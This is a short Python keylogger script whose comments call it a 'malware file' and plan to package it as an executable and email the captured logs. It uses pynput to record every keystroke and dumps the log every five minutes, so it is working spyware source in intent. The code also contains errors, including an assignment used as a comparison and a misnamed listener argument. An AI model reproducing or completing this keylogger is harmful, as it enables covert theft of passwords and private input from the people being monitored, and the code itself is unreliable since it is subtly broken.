#!/usr/bin/env python
#send mail code in malware file
#need to package or include in command line executable

import pynput.keyboard
#import pynput.mouse (if adding separate mouse logging)
import threading
#import smtplib (if sending log to an email account)

log = "" #global variable list

def key_pressed(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key = key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
def print_log():
    global log
    print(log)
    log = ""
    refresh_log = threading.Timer(300, print_log)
    refresh_log.start()

key_logger = pynput.keyboard.Listener(onpress=key_pressed)
with key_logger:
    print_log()
    key_logger.join()